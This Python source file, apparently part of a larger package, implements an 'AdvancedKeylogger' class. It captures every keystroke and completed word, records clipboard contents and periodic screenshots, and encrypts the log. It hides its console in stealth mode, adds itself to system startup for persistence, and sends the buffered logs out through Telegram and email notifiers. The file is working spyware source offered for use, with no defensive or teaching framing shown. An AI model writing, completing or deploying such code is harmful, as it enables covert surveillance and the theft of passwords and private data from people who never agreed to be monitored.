import datetime
import threading
import os
from pynput import keyboard
from .handlers import KeyHandler
from .notifiers import TelegramNotifier, EmailNotifier
from .utils import display, encryption, persistence, stealth, screenshot, clipboard
from .config import Config

class AdvancedKeylogger:
    def __init__(self, config: Config):
        self.config = config
        self.start_time = datetime.datetime.now()
        self.buffer = ""
        self.running = True
        self.timer = None
        self.screenshot_timer = None
        self.key_handler = KeyHandler()
        self.encryptor = None
        self.notifiers = []
        self.features = []

        # Setup notifiers
        if config.telegram_enabled:
            self.notifiers.append(TelegramNotifier(config.telegram_token, config.telegram_chat_id))
        if config.email_enabled:
            self.notifiers.append(EmailNotifier(
                config.smtp_server, config.smtp_port,
                config.email_user, config.email_password,
                config.email_recipient
            ))

        # Setup encryption
        if config.encrypt_log:
            self.encryptor = encryption.Encryptor(config.encryption_password)
            self.features.append("Encryption")
            self.log_file = config.log_file + ".enc"
        else:
            self.log_file = config.log_file

        # Setup stealth
        if config.stealth_mode:
            stealth.Stealth.hide_console()
            self.features.append("Stealth")

        # Setup persistence
        if config.auto_startup:
            persistence.Persistence.add_to_startup()
            self.features.append("AutoStartup")

        # Setup screenshot
        if config.screenshot_interval > 0:
            self.screenshot_taker = screenshot.ScreenshotTaker()
            self.features.append("Screenshots")

        # Setup clipboard monitor
        if config.clipboard_monitor:
            self.clipboard_mon = clipboard.ClipboardMonitor(self.on_clipboard_change)
            self.features.append("Clipboard")

    def on_clipboard_change(self, content):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] [CLIPBOARD] {content}\n"
        self._log(entry)

    def _log(self, entry):
        self.buffer += entry
        if len(self.buffer) >= 200:
            self.flush_buffer()

    def flush_buffer(self):
        if not self.buffer:
            return
        # Write to file
        mode = 'ab' if self.encryptor else 'a'
        data = self.buffer.encode('utf-8')
        if self.encryptor:
            data = self.encryptor.encrypt(data)
        with open(self.log_file, mode) as f:
            f.write(data)

        # Send to notifiers
        for notifier in self.notifiers:
            if notifier.enabled:
                notifier.send(self.buffer)

        self.buffer = ""

    def periodic_flush(self):
        if self.running:
            self.flush_buffer()
            self.timer = threading.Timer(self.config.flush_interval, self.periodic_flush)
            self.timer.daemon = True
            self.timer.start()

    def periodic_screenshot(self):
        if self.running:
            filename = self.screenshot_taker.take()
            if filename:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                entry = f"[{timestamp}] [SCREENSHOT] {filename}\n"
                self._log(entry)
            self.screenshot_timer = threading.Timer(self.config.screenshot_interval, self.periodic_screenshot)
            self.screenshot_timer.daemon = True
            self.screenshot_timer.start()

    def on_press(self, key):
        current_time = datetime.datetime.now().strftime("%H:%M:%S")
        log_entry, completed_word, should_stop = self.key_handler.process_key(key)

        if log_entry:
            full_log = f"[{current_time}] {log_entry}\n"
            self._log(full_log)
            if not self.config.stealth_mode:
                print("\033[1;32m[{}]\033[0m {}".format(current_time, log_entry))

        if completed_word is not None and completed_word != "":
            word_entry = f"[{current_time}] [WORD] {completed_word}\n"
            self._log(word_entry)
            if not self.config.stealth_mode:
                print("\033[1;36m[WORD]\033[0m {}".format(completed_word))

        if should_stop:
            if not self.config.stealth_mode:
                print("\n\033[1;31m[!]\033[0m ESC detected, stopping keylogger...")
            return False
        return True

    def start(self):
        if not self.config.stealth_mode:
            display.clear_screen()
            display.print_banner(self.start_time, self.log_file, self.notifiers, self.features)
            print("\033[1;33m[*]\033[0m Press \033[1;31mESC\033[0m to stop the keylogger")
            print("\033[1;33m[*]\033[0m Listening for keystrokes...\n")
            print("\033[1;37m" + "-" * 70 + "\033[0m\n")

        # Start periodic flush
        self.timer = threading.Timer(self.config.flush_interval, self.periodic_flush)
        self.timer.daemon = True
        self.timer.start()

        # Start screenshot timer
        if self.config.screenshot_interval > 0:
            self.screenshot_timer = threading.Timer(self.config.screenshot_interval, self.periodic_screenshot)
            self.screenshot_timer.daemon = True
            self.screenshot_timer.start()

        # Start clipboard monitor
        if self.config.clipboard_monitor:
            self.clipboard_mon.start()

        # Start key listener
        try:
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            if not self.config.stealth_mode:
                print("\n\033[1;31m[!]\033[0m Keylogger interrupted by user (Ctrl+C)")
        finally:
            self.running = False
            if self.timer:
                self.timer.cancel()
            if hasattr(self, 'screenshot_timer') and self.screenshot_timer:
                self.screenshot_timer.cancel()
            if hasattr(self, 'clipboard_mon'):
                self.clipboard_mon.stop()
            self.flush_buffer()
            if not self.config.stealth_mode:
                display.print_footer(self.start_time, self.key_handler.key_count, self.log_file)